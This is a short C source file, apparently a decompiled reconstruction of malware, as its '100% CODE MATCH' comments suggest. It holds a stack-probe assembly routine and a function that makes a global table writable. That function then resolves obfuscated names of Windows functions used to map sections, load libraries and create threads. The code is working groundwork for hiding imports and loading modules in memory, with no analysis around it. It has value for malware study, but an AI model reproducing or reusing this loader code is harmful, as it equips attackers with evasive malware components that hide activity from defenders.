/******************************************************************************************
  Copyright 2012 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "4. Encoding.h"

// 100% (ASM) CODE MATCH
void __declspec(naked) UnusedFunction()
{
	__asm
	{
		push    ecx
		lea     ecx, [esp+4]
		sub     ecx, eax
		sbb     eax, eax
		not     eax
		and     ecx, eax
		mov     eax, esp
		and     eax, 0FFFFF000h

__ASM_REF_0:
		cmp     ecx, eax
		jb      short __ASM_REF_1
		mov     eax, ecx
		pop     ecx
		xchg    eax, esp
		mov     eax, [eax]
		mov     [esp+0], eax
		retn

__ASM_REF_1:
		sub     eax, 1000h
		test    [eax], eax
		jmp     short __ASM_REF_0
	}
}

// 100% (C) CODE MATCH
BOOL DecodeEncryptedModuleNames()
{
	DWORD dwOldProtect; // [sp+0h] [bp-4h]@1
	
	if(!VirtualProtect((LPVOID)&g_hardAddrs, sizeof(HARDCODED_ADDRESSES), PAGE_EXECUTE_WRITECOPY, &dwOldProtect) &&
	   !VirtualProtect((LPVOID)&g_hardAddrs, sizeof(HARDCODED_ADDRESSES), PAGE_EXECUTE_READWRITE, &dwOldProtect))
		return FALSE;
	
	*(HMODULE*)g_hardAddrs.NTDLL_DLL = GetModuleNTDLL();
	
	*(UINT32*)g_hardAddrs.lstrcmpiW             = (UINT32)GetFunctionFromKERNEL32(ENCODED_lstrcmpiW);
	*(UINT32*)g_hardAddrs.VirtualQuery          = (UINT32)GetFunctionFromKERNEL32(ENCODED_VirtualQuery);
	*(UINT32*)g_hardAddrs.VirtualProtect        = (UINT32)GetFunctionFromKERNEL32(ENCODED_VirtualProtect);
	*(UINT32*)g_hardAddrs.GetProcAddress        = (UINT32)GetFunctionFromKERNEL32(ENCODED_GetProcAddress);
	*(UINT32*)g_hardAddrs.MapViewOfFile         = (UINT32)GetFunctionFromKERNEL32(ENCODED_MapViewOfFile);
	*(UINT32*)g_hardAddrs.UnmapViewOfFile       = (UINT32)GetFunctionFromKERNEL32(ENCODED_UnmapViewOfFile);
	*(UINT32*)g_hardAddrs.FlushInstructionCache = (UINT32)GetFunctionFromKERNEL32(ENCODED_FlushInstructionCache);
	*(UINT32*)g_hardAddrs.LoadLibraryW          = (UINT32)GetFunctionFromKERNEL32(ENCODED_LoadLibraryW);
	*(UINT32*)g_hardAddrs.FreeLibrary           = (UINT32)GetFunctionFromKERNEL32(ENCODED_FreeLibrary);
	*(UINT32*)g_hardAddrs.ZwCreateSection       = (UINT32)GetFunctionFromNTDLL(ENCODED_ZwCreateSection);
	*(UINT32*)g_hardAddrs.ZwMapViewOfSection    = (UINT32)GetFunctionFromNTDLL(ENCODED_ZwMapViewOfSection);
	*(UINT32*)g_hardAddrs.CreateThread          = (UINT32)GetFunctionFromKERNEL32(ENCODED_CreateThread);
	*(UINT32*)g_hardAddrs.WaitForSingleObject   = (UINT32)GetFunctionFromKERNEL32(ENCODED_WaitForSingleObject);
	*(UINT32*)g_hardAddrs.GetExitCodeThread     = (UINT32)GetFunctionFromKERNEL32(ENCODED_GetExitCodeThread);
	*(UINT32*)g_hardAddrs.ZwClose               = (UINT32)GetFunctionFromNTDLL(ENCODED_ZwClose);
	
	return TRUE;
}